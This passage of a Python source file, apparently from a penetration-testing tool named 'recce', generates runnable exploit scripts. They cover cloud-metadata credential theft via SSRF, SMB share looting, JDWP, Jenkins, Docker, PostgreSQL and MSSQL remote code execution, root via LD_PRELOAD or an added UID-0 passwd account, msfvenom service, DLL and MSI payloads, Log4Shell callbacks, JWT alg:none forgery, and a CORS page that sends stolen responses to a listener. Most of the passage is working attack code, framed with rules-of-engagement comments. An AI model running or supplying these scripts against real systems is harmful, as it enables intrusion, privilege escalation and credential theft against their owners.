        "echo '[GCP] the SSRF must send header  Metadata-Flavor:Google :'\n"
        "curl -s \"${U}http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\"; echo\n"
        "echo '[bypass] if 169.254.169.254 is filtered: gopher://, http://[::ffff:169.254.169.254],'\n"
        "echo '         a 302 redirect to the IMDS, decimal/octal IP encodings, or DNS rebinding.'\n"
        f"{_ROE}\n"
        "# PROOF: temp IAM creds (AccessKeyId/SecretAccessKey/Token) or an OAuth token in the\n"
        "# response = SSRF -> cloud cred theft. Use: export the 3 vars; aws sts get-caller-identity.\n")


def _sh_smb_null() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - SMB null / guest session -> anonymous enumeration + share loot.\n"
        "# PROVES unauthenticated access to shares/users/policy. Usage: sh recce_poc_smb_null.sh <ip>\n"
        "IP=\"${1:?usage: recce_poc_smb_null.sh <ip>}\"\n"
        "echo '[1] null-session shares + password policy + users:'\n"
        "nxc smb \"$IP\" -u '' -p '' --shares --users --pass-pol 2>/dev/null\n"
        "enum4linux-ng -A -u '' -p '' \"$IP\" 2>/dev/null | head -40\n"
        "echo '[2] RID cycling (enumerate users even when RestrictAnonymous is set):'\n"
        "nxc smb \"$IP\" -u '' -p '' --rid-brute 4000 2>/dev/null | head\n"
        "echo '[3] loot readable shares (spider for secrets):'\n"
        "smbclient -N -L \"//$IP/\" 2>/dev/null\n"
        "echo \"    nxc smb $IP -u '' -p '' -M spider_plus   # dumps readable files for triage\"\n"
        f"{_ROE}\n"
        "# PROOF: shares/users/policy listed over a null/guest session = anonymous exposure; "
        "a secret in a readable share (unattend.xml, keys) = credential loot.\n")


def _sh_jdwp() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - Java Debug Wire Protocol (JDWP) exposed -> unauthenticated RCE.\n"
        "# JDWP has NO authentication: attaching = code execution as the JVM user.\n"
        "# Usage: sh recce_poc_jdwp.sh <ip> [port]\n"
        "IP=\"${1:?usage: recce_poc_jdwp.sh <ip> [port]}\"; PORT=\"${2:-8000}\"\n"
        "echo '[1] confirm the JDWP handshake:'\n"
        "printf 'JDWP-Handshake' | ncat -w3 \"$IP\" \"$PORT\" 2>/dev/null | grep -q 'JDWP-Handshake' \\\n"
        "  && echo '[+] JDWP speaks - unauthenticated debugger' || echo '[-] no handshake'\n"
        "echo '[2] RCE (ROE) via the published exploit:'\n"
        "echo \"    python2 jdwp-shellifier.py -t $IP -p $PORT --cmd 'id > /tmp/recce_poc 2>&1'\"\n"
        "echo \"    or: jdb -attach $IP:$PORT  then breakpoint + eval Runtime.getRuntime().exec(...)\"\n"
        f"{_ROE}\n"
        "# PROOF: the JDWP-Handshake echo = unauthenticated debug port; jdwp-shellifier "
        "output / /tmp/recce_poc = remote code execution.\n")


def _sh_docker() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - exposed Docker Engine API (unauth 2375/2376) -> host RCE via a\n"
        "# container that mounts the host filesystem. Usage: sh recce_poc_docker.sh <ip> [port]\n"
        "IP=\"${1:?usage: recce_poc_docker.sh <ip> [port]}\"; PORT=\"${2:-2375}\"; H=\"tcp://$IP:$PORT\"\n"
        "echo '[1] confirm unauthenticated API access:'\n"
        "docker -H \"$H\" version && docker -H \"$H\" ps -a\n"
        "echo '[2] host RCE (ROE): run a container mounting host root, read a root-only file:'\n"
        "echo \"    docker -H $H run --rm -v /:/host alpine cat /host/etc/shadow | head\"\n"
        "echo \"    persistence (ROE): chroot /host; add a user / SSH key / cron entry\"\n"
        f"{_ROE}\n"
        "# PROOF: docker version/ps answered with no auth = full daemon control; reading "
        "/host/etc/shadow from a mounted container = root on the host.\n")


def _sh_jenkins() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - Jenkins Script Console -> RCE (Groovy runs as the Jenkins user).\n"
        "# Works unauth if anonymous has Overall/RunScripts, else with a user + API token.\n"
        "# Usage: sh recce_poc_jenkins.sh http://<ip>:<port> [user] [api-token]\n"
        "U=\"${1:?usage: recce_poc_jenkins.sh http://ip:port [user] [api-token]}\"; JU=\"${2:-}\"; JT=\"${3:-}\"\n"
        "if [ -n \"$JU\" ]; then A=\"-u $JU:$JT\"; else A=\"\"; fi\n"
        "echo '[1] version + identity:'\n"
        "curl -skI $A \"$U/\" | grep -i x-jenkins\n"
        "curl -sk $A \"$U/whoAmI/api/json\" 2>/dev/null; echo\n"
        "echo '[2] Script Console RCE (Groovy):'\n"
        "curl -sk $A \"$U/scriptText\" --data-urlencode \"script=println 'id'.execute().text\"\n"
        f"{_ROE}\n"
        "# PROOF: the scriptText call returns command output = RCE as the Jenkins service "
        "account (from there: dump credentials.xml + the master key).\n")


def _sh_ipmi() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - IPMI 2.0 RAKP hash disclosure (CVE-2013-4786) + cipher-zero bypass.\n"
        "# PROVES BMC credential exposure / auth bypass. Usage: sh recce_poc_ipmi.sh <ip>\n"
        "IP=\"${1:?usage: recce_poc_ipmi.sh <ip>}\"\n"
        "echo '[1] RAKP HMAC grab (protocol flaw: any username yields a crackable hash):'\n"
        "echo \"    msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS $IP; run; exit'\"\n"
        "echo '    crack:  hashcat -m 7300 recce_ipmi.hash <wordlist>'\n"
        "echo '[2] cipher-zero auth bypass (accepts ANY password with no crypto):'\n"
        "echo \"    ipmitool -I lanplus -C 0 -H $IP -U Administrator -P x user list\"\n"
        "echo '[3] default BMC creds to try: ADMIN/ADMIN, root/calvin (Dell iDRAC), admin/admin.'\n"
        f"{_ROE}\n"
        "# PROOF: a RAKP HMAC returned = crackable BMC creds; cipher-0 'user list' output = "
        "auth bypass -> BMC takeover (KVM, power, often a host foothold).\n")


def _sh_smtp_relay() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - SMTP open relay + user enumeration. PROVES the server relays mail\n"
        "# for arbitrary senders/recipients (spoofing / phishing). Usage: sh recce_poc_smtp.sh <ip> [port]\n"
        "IP=\"${1:?usage: recce_poc_smtp.sh <ip> [port]}\"; PORT=\"${2:-25}\"\n"
        "echo '[1] banner + advertised capabilities:'\n"
        "printf 'EHLO recce.test\\r\\nQUIT\\r\\n' | ncat -w5 \"$IP\" \"$PORT\" 2>/dev/null\n"
        "echo '[2] open-relay test (external sender -> external recipient):'\n"
        "echo \"    swaks --server $IP:$PORT --from attacker@evil.test --to victim@external.test \\\\\"\n"
        "echo \"          --header 'Subject: recce relay test'\"\n"
        "echo '[3] user enumeration (VRFY / RCPT):'\n"
        "echo \"    smtp-user-enum -M VRFY -U users.txt -t $IP -p $PORT   # try -M RCPT if VRFY is disabled\"\n"
        f"{_ROE}\n"
        "# PROOF: swaks reports '250 ... message accepted' for an external->external mail = "
        "open relay; a VRFY/RCPT 250 = a valid mailbox (username enumeration).\n")


# --- recipe registry ------------------------------------------------------------
# files : {filename: source}   build : [shell build commands]
# deliver: how to place/trigger it   proof: how to confirm it fired

RECIPES: dict[str, dict] = {
    "ld_preload": {
        "name": "LD_PRELOAD / writable-.so / SUID env-injection -> root",
        "files": {"recce_poc_preload.c": _c_ld_preload()},
        "build": ["gcc -fPIC -shared -nostartfiles -o /tmp/recce_poc.so recce_poc_preload.c"],
        "deliver": "sudo LD_PRELOAD=/tmp/recce_poc.so <allowed-sudo-cmd>   "
                   "(or: echo /tmp/recce_poc.so >> /etc/ld.so.preload  then invoke any SUID, e.g. ping)",
        "proof": "cat /tmp/recce_poc.txt   -> uid=0(root)",
    },
    "linux_root_job": {
        "name": "Writable cron / service / PATH-hijack -> root",
        "files": {"recce_poc_root.sh": _sh_root_job()},
        "build": ["chmod +x recce_poc_root.sh"],
        "deliver": "point the writable job at recce_poc_root.sh (or name it as the hijacked command in the "
                   "writable PATH dir); wait for the root job/cron to run it.",
        "proof": "cat /tmp/recce_poc.txt   -> uid=0(root)",
    },
    "linux_passwd": {
        "name": "Writable /etc/passwd -> add a UID-0 account",
        "files": {},
        "build": ["openssl passwd -6 'Recce!Poc123'      # copy the hash into the line below"],
        "deliver": "echo 'recce_poc:<hash-from-above>:0:0::/root:/bin/bash' >> /etc/passwd",
        "proof": "su recce_poc  (password Recce!Poc123)  -> id shows uid=0.  REMOVE the line afterwards.",
    },
    "win_service_exe": {
        "name": "Unquoted path / writable service binary / autorun -> SYSTEM",
        "files": {"recce_poc_exe.c": _c_win_exe()},
        "build": [
            'msfvenom -p windows/x64/exec CMD="cmd /c whoami > C:\\recce_poc.txt" -f exe-service -o payload.exe'
            "   # real services (does the SCM handshake)",
            "x86_64-w64-mingw32-gcc recce_poc_exe.c -o payload.exe"
            "   # plain exe for unquoted-path / autorun / writable-binary intercepts",
        ],
        "deliver": "copy payload.exe to the exact plant/overwrite path recce named; "
                   "sc stop <svc> & sc start <svc>  (or wait for the trigger).",
        "proof": "type C:\\recce_poc.txt   -> nt authority\\system",
    },
    "win_dll": {
        "name": "DLL hijack -> code exec in the target (often SYSTEM) process",
        "files": {"recce_poc_dll.c": _c_win_dll()},
        "build": [
            'msfvenom -p windows/x64/exec CMD="cmd /c whoami > C:\\recce_poc.txt" -f dll -o evil.dll',
            "x86_64-w64-mingw32-gcc recce_poc_dll.c -shared -o evil.dll"
            "   # proxy the real exports so the host app keeps working",
        ],
        "deliver": "rename evil.dll to the missing/hijacked DLL recce identified; place it in the writable "
                   "dir; start/restart the target exe/service.",
        "proof": "type C:\\recce_poc.txt   -> the target process's context",
    },
    "web": {
        "name": "Web exposure / dangerous method -> proof requests",
        "files": {"recce_poc_web.sh": _sh_web()},
        "build": ["chmod +x recce_poc_web.sh"],
        "deliver": "sh recce_poc_web.sh http://<target>:<port>",
        "proof": "the fetched .git/.env/actuator content, or the PUT marker echoed back.",
    },
    "win_msi": {
        "name": "AlwaysInstallElevated -> SYSTEM via MSI",
        "files": {},
        "build": ['msfvenom -p windows/x64/exec CMD="net localgroup administrators recce_poc /add" '
                  "-f msi -o recce_poc.msi"],
        "deliver": "msiexec /quiet /qn /i recce_poc.msi",
        "proof": "net localgroup administrators  -> lists recce_poc.  REMOVE it afterwards "
                 "(net localgroup administrators recce_poc /del).",
    },
    "db_unauth_read": {
        "name": "Unauthenticated database -> anonymous data read (proof)",
        "files": {"recce_poc_db_read.sh": _sh_db_read()},
        "build": ["chmod +x recce_poc_db_read.sh"],
        "deliver": "sh recce_poc_db_read.sh <ip> <port> <engine>   "
                   "(memcached|couchdb|influxdb|cassandra|redis|elasticsearch|mongodb)",
        "proof": "the databases / keyspaces / indices / cached keys returned with no "
                 "credential = confirmed anonymous read exposure.",
    },
    "redis_rce": {
        "name": "Redis unauth CONFIG+SAVE -> arbitrary file write / RCE",
        "files": {"recce_poc_redis_rce.sh": _sh_redis_rce()},
        "build": ["chmod +x recce_poc_redis_rce.sh"],
        "deliver": "sh recce_poc_redis_rce.sh <ip> <port>   "
                   "(plants a benign /tmp marker; escalate to ~/.ssh/cron/webshell in ROE)",
        "proof": "cat /tmp/recce_poc.txt on the target -> the marker = arbitrary file "
                 "write confirmed (one step from RCE).",
    },
    "couchdb_rce": {
        "name": "CouchDB admin-party / CVE-2017-12635 -> admin -> query-server RCE",
        "files": {"recce_poc_couchdb.sh": _sh_couchdb_rce()},
        "build": ["chmod +x recce_poc_couchdb.sh"],
        "deliver": "sh recce_poc_couchdb.sh <ip> <port>   "
                   "(creates a throwaway admin; register a query_server for RCE in ROE)",
        "proof": "the throwaway admin authenticates to /_all_dbs -> full admin control "
                 "(then query-server = RCE). REMOVE the admin afterwards.",
    },
    "postgres_rce": {
        "name": "PostgreSQL COPY ... FROM PROGRAM -> OS command execution",
        "files": {"recce_poc_pg_rce.sh": _sh_pg_rce()},
        "build": ["chmod +x recce_poc_pg_rce.sh"],
        "deliver": "sh recce_poc_pg_rce.sh <ip> <port> [user] [db]   "
                   "(needs a superuser login, e.g. via trust auth or weak creds)",
        "proof": "the result table holds the output of `id`/`uname -a` from the DB "
                 "host -> OS command execution confirmed.",
    },
    "zerologon": {
        "name": "Zerologon (CVE-2020-1472) -> instant domain-controller takeover",
        "files": {"recce_poc_zerologon.sh": _sh_zerologon()},
        "build": ["# fetch the SecuraBV zerologon_tester.py (published detector) to this dir"],
        "deliver": "sh recce_poc_zerologon.sh <dc-netbios-name> <dc-ip>   "
                   "(DETECTION only; the full exploit resets the DC password - ROE + restore plan)",
        "proof": "'Success! Target is vulnerable' from the detector = exploitable.",
    },
    "log4shell": {
        "name": "Log4Shell (CVE-2021-44228) -> unauth RCE via JNDI lookup",
        "files": {"recce_poc_log4shell.sh": _sh_log4shell()},
        "build": ["chmod +x recce_poc_log4shell.sh",
                  "# start a canary: nc -lvnp 1389   (or a DNS/LDAP canary)"],
        "deliver": "sh recce_poc_log4shell.sh http://<target>:<port> <LHOST> [LPORT]",
        "proof": "a callback to your listener/canary = the target resolved the JNDI URL "
                 "(vulnerable). Serve an exploit class only within ROE.",
    },
    "kerberoast": {
        "name": "Kerberoast / AS-REP roast -> offline-crackable Kerberos hashes",
        "files": {"recce_poc_kerberoast.sh": _sh_kerberoast()},
        "build": ["chmod +x recce_poc_kerberoast.sh"],
        "deliver": "sh recce_poc_kerberoast.sh <domain> <dc-ip> [user] [pass]   "
                   "(with creds -> Kerberoast SPNs; without -> AS-REP roast from users.txt)",
        "proof": "a cracked TGS/AS-REP hash (hashcat -m 13100 / -m 18200) -> valid domain creds.",
    },
    "mysql_read": {
        "name": "MySQL empty-root / weak creds -> DB read + credential loot",
        "files": {"recce_poc_mysql.sh": _sh_mysql()},
        "build": ["chmod +x recce_poc_mysql.sh"],
        "deliver": "sh recce_poc_mysql.sh <ip> [port] [user]",
        "proof": "user/authentication_string rows returned with an empty password = access.",
    },
    "mssql_rce": {
        "name": "MSSQL xp_cmdshell -> OS command execution",
        "files": {"recce_poc_mssql.sh": _sh_mssql()},
        "build": ["chmod +x recce_poc_mssql.sh"],
        "deliver": "sh recce_poc_mssql.sh <ip> <user> <pass>   (needs sysadmin, e.g. weak sa)",
        "proof": "the whoami output from the DB host = OS command execution.",
    },
    "snmp_read": {
        "name": "SNMP default community -> information disclosure",
        "files": {"recce_poc_snmp.sh": _sh_snmp()},
        "build": ["chmod +x recce_poc_snmp.sh"],
        "deliver": "sh recce_poc_snmp.sh <ip> [community]",
        "proof": "system/process data returned = read with a default/guessed community.",
    },
    "nfs_root_squash": {
        "name": "NFS no_root_squash -> privileged write / SUID-root shell",
        "files": {"recce_poc_nfs.sh": _sh_nfs()},
        "build": ["chmod +x recce_poc_nfs.sh"],
        "deliver": "sudo sh recce_poc_nfs.sh <ip> </exported/path>",
        "proof": "a root-owned file / SUID rootbash on the export = no_root_squash abuse.",
    },
    "heartbleed": {
        "name": "Heartbleed (CVE-2014-0160) -> TLS heap memory disclosure",
        "files": {"recce_poc_heartbleed.sh": _sh_heartbleed()},
        "build": ["chmod +x recce_poc_heartbleed.sh"],
        "deliver": "sh recce_poc_heartbleed.sh <ip> [port]",
        "proof": "'State: VULNERABLE' / leaked heap bytes = memory disclosure (a READ "
                 "primitive — creds/session tokens may leak; not a crash).",
    },
    "smb_relay": {
        "name": "NTLM relay (SMB signing not required) -> auth relayed to a signing-less host",
        "files": {"recce_poc_smb_relay.sh": _sh_smb_relay()},
        "build": ["chmod +x recce_poc_smb_relay.sh",
                  "# needs impacket (ntlmrelayx), netexec, and a coercion tool (PetitPotam/coercer)"],
        "deliver": "sh recce_poc_smb_relay.sh <attacker-ip> <victim-dc-ip> [relay-subnet]",
        "proof": "ntlmrelayx authenticates to a relay target AS the coerced account "
                 "(SAM dump / command) = relay confirmed. No password cracked.",
    },
    "adcs_esc1": {
        "name": "ADCS ESC1 (attacker-supplied subject) -> domain privilege escalation",
        "files": {"recce_poc_esc1.sh": _sh_esc1()},
        "build": ["chmod +x recce_poc_esc1.sh", "# needs certipy"],
        "deliver": "sh recce_poc_esc1.sh <domain> <dc-ip> <ca-name> <template> <user> <pass> [impersonate]",
        "proof": "certipy auth returns a TGT + the NT hash of the impersonated privileged "
                 "user = ESC1 -> domain escalation.",
    },
    "k8s_exposed": {
        "name": "Exposed Kubernetes API / anonymous access -> cluster read (-> takeover)",
        "files": {"recce_poc_k8s.sh": _sh_k8s()},
        "build": ["chmod +x recce_poc_k8s.sh", "# needs kubectl"],
        "deliver": "sh recce_poc_k8s.sh <ip> [port]",
        "proof": "pods/secrets returned with no token = anonymous cluster access "
                 "(then a SA token / pod exec -> cluster takeover).",
    },
    "imds_ssrf": {
        "name": "SSRF -> cloud metadata (IMDS) -> instance role credential theft",
        "files": {"recce_poc_imds_ssrf.sh": _sh_imds_ssrf()},
        "build": ["chmod +x recce_poc_imds_ssrf.sh"],
        "deliver": "sh recce_poc_imds_ssrf.sh 'http://<target>/<ssrf-endpoint>?url='",
        "proof": "temporary IAM/role creds or an OAuth token in the response = SSRF "
                 "-> cloud credential theft (pivot into the cloud account).",
    },
    "smb_null_session": {
        "name": "SMB null/guest session -> anonymous enumeration + share loot",
        "files": {"recce_poc_smb_null.sh": _sh_smb_null()},
        "build": ["chmod +x recce_poc_smb_null.sh", "# needs netexec, enum4linux-ng, smbclient"],
        "deliver": "sh recce_poc_smb_null.sh <ip>",
        "proof": "shares/users/policy over a null/guest session = anonymous exposure; "
                 "a secret in a readable share = credential loot.",
    },
    "jdwp_rce": {
        "name": "Java Debug Wire Protocol (JDWP) exposed -> unauthenticated RCE",
        "files": {"recce_poc_jdwp.sh": _sh_jdwp()},
        "build": ["chmod +x recce_poc_jdwp.sh", "# needs jdwp-shellifier for the RCE step"],
        "deliver": "sh recce_poc_jdwp.sh <ip> [port]",
        "proof": "the JDWP handshake echo = unauth debug port; jdwp-shellifier output = RCE.",
    },
    "docker_api": {
        "name": "Exposed Docker Engine API (unauth) -> host RCE",
        "files": {"recce_poc_docker.sh": _sh_docker()},
        "build": ["chmod +x recce_poc_docker.sh", "# needs the docker client"],
        "deliver": "sh recce_poc_docker.sh <ip> [port]",
        "proof": "docker version/ps unauth = daemon control; reading /host/etc/shadow "
                 "from a mounted container = root on the host.",
    },
    "jenkins_rce": {
        "name": "Jenkins Script Console -> RCE (Groovy as the Jenkins user)",
        "files": {"recce_poc_jenkins.sh": _sh_jenkins()},
        "build": ["chmod +x recce_poc_jenkins.sh"],
        "deliver": "sh recce_poc_jenkins.sh http://<ip>:<port> [user] [api-token]",
        "proof": "the /scriptText call returns command output = RCE (then dump "
                 "credentials.xml + the master key).",
    },
    "ipmi_hash": {
        "name": "IPMI 2.0 RAKP hash disclosure + cipher-zero bypass -> BMC takeover",
        "files": {"recce_poc_ipmi.sh": _sh_ipmi()},
        "build": ["chmod +x recce_poc_ipmi.sh", "# needs metasploit + ipmitool"],
        "deliver": "sh recce_poc_ipmi.sh <ip>",
        "proof": "a RAKP HMAC = crackable BMC creds; cipher-0 'user list' output = "
                 "auth bypass -> BMC takeover.",
    },
    "smtp_relay": {
        "name": "SMTP open relay + user enumeration",
        "files": {"recce_poc_smtp.sh": _sh_smtp_relay()},
        "build": ["chmod +x recce_poc_smtp.sh", "# needs swaks, smtp-user-enum, ncat"],
        "deliver": "sh recce_poc_smtp.sh <ip> [port]",
        "proof": "'250 message accepted' for an external->external mail = open relay; "
                 "a VRFY/RCPT 250 = a valid mailbox.",
    },
}


_MATCH = [
    (r"ld_preload|ld\.so\.preload|env-injection|env_keep.*ld_|writable (shared-)?librar|\.so hijack",
     "ld_preload"),
    (r"/etc/passwd is writable|writable /etc/passwd", "linux_passwd"),
    (r"path-hijack|path hijack|writable cron|writable .*timer|writable service unit|runs a writable binary|"
     r"writable root|writable library dir", "linux_root_job"),
    (r"alwaysinstallelevated", "win_msi"),
    (r"exposed (git|\.git|\.env|svn|\.ds_store|aws)|\.env file|mod_status exposed|"
     r"mod_info exposed|actuator|phpinfo|directory listing enabled|dangerous http methods|"
     r"web\.config readable|crossdomain|prometheus /metrics|\.htpasswd|graphql introspection|"
     r"cors reflects|server-side template injection|jwt (accepts|uses)|secret in client-side js|"
     r"backup/source file", "web"),
    # AD / flagship n-days: dedicated PoCs before the generic buckets.
    (r"zerologon|cve[- ]?2020[- ]?1472|netlogon.*(privilege|reset|takeover)", "zerologon"),
    (r"log4shell|log4j|cve[- ]?2021[- ]?44228|jndi.*(lookup|inject)", "log4shell"),
    (r"kerberoast|as[- ]?rep roast|asrep|getuserspns|getnpusers|"
     r"spn.*(account|roast)|no pre[- ]?auth", "kerberoast"),
    # Databases: the RCE-capable weaknesses first (a redis/couchdb/postgres finding
    # gets its dedicated escalation harness), then the generic anonymous-read proof for
    # every other exposed engine.
    (r"redis exposed without auth|config[ -]?set dir|write primitive available|"
     r"redis.*(file[ -]?write|-> ?rce)", "redis_rce"),
    (r"mssql|xp_cmdshell|sql server.*(weak|sa |sysadmin)", "mssql_rce"),
    (r"mysql root|mysql.*(empty|weak).*(password|login|cred)|empty[- ]password.*mysql", "mysql_read"),
    (r"snmp.*(public|default community|community 'public'|read community)", "snmp_read"),
    (r"no_root_squash|nfs export.*(world|writable|root)|nfs.*root[_ ]?squash", "nfs_root_squash"),
    (r"heartbleed|cve[- ]?2014[- ]?0160|openssl.*memory disclosure|tls.*memory disclosure", "heartbleed"),
    # NTLM relay: match the vuln, NOT the "signing enforced (good)" info finding.
    (r"ntlm relay|relay to this host|smb signing not required(?!.*(is false|enforced|good|required))",
     "smb_relay"),
    (r"esc1|adcs.*esc1|certificate template.*(enrollee|supplies subject|client auth)|"
     r"vulnerable certificate template|misconfigured (cert|ca) template", "adcs_esc1"),
    (r"kubernetes|kube[- ]?api(server)?|kubelet|k8s.*(exposed|anonymous|unauth)|"
     r"exposed kubernetes", "k8s_exposed"),
    (r"ssrf.*(imds|metadata|cloud|169\.254)|imds.*(ssrf|expos)|instance metadata "
     r"(service|expos)|cloud metadata", "imds_ssrf"),
    (r"null[- ]?session|null/guest session|guest session|anonymous smb|"
     r"restrictanonymous|rid[- ]?cycl", "smb_null_session"),
    (r"\bjdwp\b|java debug wire", "jdwp_rce"),
    (r"docker (engine |remote |daemon )?api|docker.*(2375|2376|exposed|unauth)|"
     r"exposed docker", "docker_api"),
    (r"\bjenkins\b", "jenkins_rce"),
    (r"\bipmi\b|\brakp\b|baseboard management|\bbmc\b.*(expos|hash|default)", "ipmi_hash"),
    (r"open relay|mail relay|smtp.*(relay|vrfy|user enum)", "smtp_relay"),
    (r"admin party|couchdb.*(admin|privileg|12635|12636|query[ -]?server)", "couchdb_rce"),
    (r"trust authentication|copy \.\.\. from program|copy .*from program|"
     r"from program.*(rce|command)", "postgres_rce"),
    (r"exposed without authentication|unauthenticated (database|query|data|index)|"
     r"no authentication \(allowall\)|allowallauthenticator|empty[ -]password login|"
     r"unauth.*(indices|data|read)|memcached exposed|cassandra exposed|"
     r"influxdb exposed|elasticsearch exposed|mongodb exposed", "db_unauth_read"),
    (r"unquoted service|writable service binary|writable autorun|writable scheduled-task|"
     r"writable service registry", "win_service_exe"),
    (r"dll hijack|writable directory in (system|user) path|writable app dir|com inprocserver|com hijack|"
     r"service binary directory is writable", "win_dll"),
]
_MATCH_C = [(re.compile(p, re.I), k) for p, k in _MATCH]


# --- per-finding web PoCs -------------------------------------------------------
# A tailored, runnable proof for each web finding type, with the target
# URL filled in. RCE escalations reference the published PoC (run in ROE).

_TLS_PORTS = {443, 8443, 9443, 4443, 10443, 5986}


def _url_from_vuln(v) -> str:
    # Restrict to URL-safe host/port characters (no shell metacharacters): this URL
    # is interpolated into generated PoC shell scripts, and v.output is derived from
    # network data. A hostile "http://evil$(id)" is truncated at the '$' to a safe
    # "http://evil" rather than carried into the script.
    m = re.search(r"https?://[A-Za-z0-9.\-:\[\]%_]+", getattr(v, "output", "") or "")
    if m:
        return m.group(0)
    port = getattr(v, "port", None)
    if not port:
        return f"http://{v.ip}"
    sch = "https" if port in _TLS_PORTS else "http"
    hostport = v.ip if port in (80, 443) else f"{v.ip}:{port}"
    return f"{sch}://{hostport}"


def _p_git(u):
    return ("sh", "#!/bin/sh\n# recce .git PoC - dump the exposed repo and prove secret exposure (read-only).\n"
            + _ROE + "\n# needs: pipx install git-dumper\n"
            f"git-dumper \"{u}/.git\" ./recce_git_loot >/dev/null 2>&1\n"
            "n=$(grep -rinE 'password|secret|api[_-]?key|token|BEGIN .*PRIVATE KEY' ./recce_git_loot 2>/dev/null | tee /tmp/recce_git_hits | wc -l)\n"
            "if [ -d ./recce_git_loot ]; then echo \"PROVEN: recovered the repository; ${n} secret-like line(s):\"; head /tmp/recce_git_hits; "
            "else echo 'could not dump .git'; fi\n",
            "dump the source + secrets from the exposed .git")


def _p_cors(u):
    js = (
        "<!-- recce CORS PoC - proves the target reflects our Origin + credentials.\n"
        "     Host on a server you control; open it in a browser logged into the target.\n"
        "     ROE: this only READS the victim's own response - set your ACTION at the marked line. -->\n"
        "<pre id=o>running...</pre>\n<script>\n"
        "fetch(%r, {credentials:'include'}).then(r=>r.text()).then(t=>{\n"
        "  o.textContent = 'PROVEN: read '+t.length+\" bytes of the victim's AUTHENTICATED response:\\n\\n\"+t.slice(0,500);\n"
        "  // ACTION (ROE): exfil to your listener -> navigator.sendBeacon('http://YOUR-LISTENER/', t);\n"
        "}).catch(e=>o.textContent='not exploitable (CORS blocked): '+e);\n</script>\n" % u)
    return ("html", js,
            "open in a logged-in browser: reads the victim's cross-origin authenticated response")


def _p_jwt(u):
    # Stronger proof: forge alg:none, then REPLAY it and show accepted-vs-denied so a
    # CONFIRMED is unarguable in the report.
    body = [
        "#!/usr/bin/env python3",
        "# recce JWT alg:none PoC - forge an unsigned token and prove the server accepts it.",
        _ROE,
        "import base64, json, sys, urllib.request, urllib.error",
        "URL = " + repr(u),
        "tok = sys.argv[1] if len(sys.argv) > 1 else 'PASTE_JWT_HERE'",
        "def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()",
        "def status(bearer):",
        "    hdr = {'Authorization': 'Bearer ' + bearer} if bearer else {}",
        "    try: return urllib.request.urlopen(urllib.request.Request(URL, headers=hdr), timeout=8).getcode()",
        "    except urllib.error.HTTPError as e: return e.code",
        "    except Exception as e: return 'err:' + str(e)",
        "h, p, _ = tok.split('.')",
        "claims = json.loads(base64.urlsafe_b64decode(p + '=' * (-len(p) % 4)))",
        "claims['recce_poc'] = True        # ACTION (ROE): set the claim you want to assert",
        'forged = b64u(b\'{"alg":"none","typ":"JWT"}\') + \'.\' + b64u(json.dumps(claims).encode()) + \'.\'',
        "print('forged token   :', forged)",
        "print('no-token status:', status(''))",
        "print('forged  status :', status(forged))",
        "print('PROVEN if the forged status is authorized (e.g. 200) where no-token is 401/403 "
        "-> the server trusted alg:none.')",
    ]
    return ("py", "\n".join(body) + "\n",
            "forge an alg:none token, replay it, and show accepted-vs-denied")


def _p_ssti(u):
    return ("sh", "#!/bin/sh\n# recce SSTI PoC - prove code execution in the template + identify the engine.\n"
            + _ROE + "\n"
            f'U="{u}"\n'
            "enc(){ python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' \"$1\"; }\n"
            "hit=''\n"
            "for p in 'rc{{7*7}}' 'rc${7*7}' 'rc#{7*7}' 'rc<%=7*7%>'; do\n"
            "  r=$(curl -sk \"$U?rc=$(enc \"$p\")\" | grep -oE 'rc[0-9]+' | head -1)\n"
            "  if [ \"$r\" = 'rc49' ]; then echo \"PROVEN: '$p' evaluated to 49 -> the engine executed our input.\"; hit=\"$p\"; break; fi\n"
            "done\n"
            "[ -z \"$hit\" ] && { echo 'not injectable on ?rc='; exit 0; }\n"
            "s=$(curl -sk \"$U?rc=$(enc \"rc{{7*'7'}}\")\" | grep -oE 'rc[0-9]+' | head -1)\n"
            "[ \"$s\" = 'rc7777777' ] && echo 'engine: Jinja2/Twig (string multiply)'\n"
            "# ACTION (ROE): read-primitive/RCE ->  tplmap -u \"$U?rc=*\"\n",
            "prove template execution (7*7->49) + fingerprint the engine")


def _p_graphql(u):
    return ("sh", "#!/bin/sh\n# recce GraphQL PoC - prove introspection by dumping the schema.\n"
            + _ROE + "\n"
            f'U="{u}"\n'
            "out=$(curl -sk -X POST -H 'Content-Type: application/json' "
            "-d '{\"query\":\"query{__schema{types{name}}}\"}' \"$U/graphql\")\n"
            "n=$(printf '%s' \"$out\" | grep -o '\"name\"' | wc -l)\n"
            "echo \"PROVEN: introspection returned ${n} schema type(s).\"\n"
            "printf '%s' \"$out\" | python3 -m json.tool 2>/dev/null | head -40\n",
            "dump the GraphQL schema (proves introspection is on)")


def _p_heapdump(u):
    return ("sh", "#!/bin/sh\n# recce Actuator heapdump PoC - download memory and prove secret exposure.\n"
            + _ROE + "\n"
            f"curl -sk \"{u}/actuator/heapdump\" -o recce_heap.hprof\n"
            "n=$(strings recce_heap.hprof 2>/dev/null | grep -icE 'password|secret|token|jdbc:|api[_-]?key')\n"
            "echo \"PROVEN: heapdump downloaded; ${n} secret-like string(s). Sample:\"\n"
            "strings recce_heap.hprof 2>/dev/null | grep -iE 'password|secret|token|jdbc:' | sort -u | head -20\n",
            "download the heapdump and surface in-memory secrets")


def _p_methods(u):
    return ("sh", "#!/bin/sh\n# recce HTTP PUT PoC - prove a write primitive, then clean up.\n"
            + _ROE + "\n"
            f'U="{u}"\n'
            "code=$(curl -sk -X PUT \"$U/recce_poc.txt\" -d 'recce_poc' -o /dev/null -w '%{http_code}')\n"
            "body=$(curl -sk \"$U/recce_poc.txt\")\n"
            "if [ \"$body\" = 'recce_poc' ]; then echo \"PROVEN: PUT stored a file we read back (HTTP $code).\"; "
            "else echo \"PUT not writable (HTTP $code).\"; fi\n"
            "# ACTION (ROE): upload your authorized file instead of the marker.\n"
            "curl -sk -X DELETE \"$U/recce_poc.txt\" -o /dev/null   # cleanup\n",
